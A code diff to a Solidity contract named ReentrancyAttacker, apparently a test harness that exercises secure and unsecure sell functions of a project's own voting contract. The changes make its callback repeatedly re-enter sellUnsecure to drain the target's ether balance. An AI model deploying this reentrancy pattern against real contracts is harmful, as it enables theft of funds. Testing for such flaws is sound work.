@@ -25,14 +25,15 @@ contract ReentrancyAttacker {
         }
 
         if (!_isAttacked) {
-            if (_amount < 2) {
-                attackSellSecure();
-            }
+            attackSellSecure(10);
 
             return;
         }
 
-        attackSellUnsecure();
+        if (address(_voting).balance > msg.value) {
+            _amount++;
+            _voting.sellUnsecure(100000);
+        }
     }
 
     function buy(uint256 amount) external payable {
@@ -40,17 +41,17 @@ contract ReentrancyAttacker {
         _voting.buy{value: msg.value}(amount);
     }
 
-    function attackSellUnsecure() public {
+    function attackSellUnsecure(uint256 amount) public {
         _isAttacked = true;
         _buyed = false;
         _amount++;
-        _voting.sellUnsecure(10);
+        _voting.sellUnsecure(amount);
     }
 
-    function attackSellSecure() public {
+    function attackSellSecure(uint256 amount) public {
         _buyed = false;
         _amount++;
-        _voting.sell(10);
+        _voting.sell(amount);
     }
 
     function getBalance() external view returns (uint256) {
